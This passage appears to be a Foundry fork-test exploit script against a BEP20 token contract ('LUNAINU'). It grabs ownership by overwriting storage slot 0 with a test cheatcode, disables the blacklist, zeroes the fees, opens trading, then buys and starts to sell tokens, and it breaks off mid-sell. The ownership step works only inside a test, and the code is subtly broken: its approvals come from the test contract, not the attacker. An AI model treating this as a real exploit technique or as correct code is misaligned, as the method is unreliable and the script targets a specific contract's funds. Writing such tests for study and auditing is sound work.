        // Step 1: Become owner by overwriting storage slot 0
        bytes32 ownerSlot = bytes32(uint256(0));
        bytes32 newOwner = bytes32(uint256(uint160(attacker)));
        vm.store(TARGET, ownerSlot, newOwner);

        // Step 2: Get router address
        address routerAddress = IBEP20LUNAINU(TARGET).router();
        IDEXRouter router = IDEXRouter(routerAddress);

        // Get WBNB from router
        address wbnb = router.WETH();

        // Step 3: Disable blacklist mode
        vm.prank(attacker);
        (bool success, ) = TARGET.call(abi.encodeWithSignature("manage_blacklist_status(bool)", false));
        require(success, "Failed to disable blacklist");

        // Step 4: Set all multipliers to 0
        vm.prank(attacker);
        (success, ) = TARGET.call(abi.encodeWithSignature("setMultipliers(uint256,uint256,uint256)", 0, 0, 0));
        require(success, "Failed to set multipliers");

        // Step 5: Open trading
        vm.prank(attacker);
        (success, ) = TARGET.call(abi.encodeWithSignature("tradingStatus(bool)", true));
        require(success, "Failed to open trading");

        // Step 6: Prepare for swap - give attacker WBNB
        deal(wbnb, attacker, 100 ether);
        IBEP20(wbnb).approve(routerAddress, type(uint256).max);

        // Also need some BNB for gas and potential ETH transfers
        deal(attacker, 100 ether);

        // Step 7: Buy tokens
        address[] memory path = new address[](2);
        path[0] = wbnb;
        path[1] = TARGET;

        // First, check if we have enough WBNB balance
        uint256 wbnbBalance = IBEP20(wbnb).balanceOf(attacker);
        require(wbnbBalance > 0, "No WBNB");

        // Approve router to spend WBNB
        IBEP20(wbnb).approve(routerAddress, wbnbBalance);

        // Buy tokens with WBNB
        uint256 amountIn = 1 ether; // 1 WBNB
        vm.prank(attacker);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIn,
            0,
            path,
            attacker,
            block.timestamp
        );

        // Step 8: Sell tokens back
        uint256 tokenBalance = IBEP20(TARGET).balanceOf(attacker);
        require(tokenBalance > 0, "No tokens to sell");

        // Approve router to spend tokens
        IBEP20(TARGET).approve(routerAddress, tokenBalance);

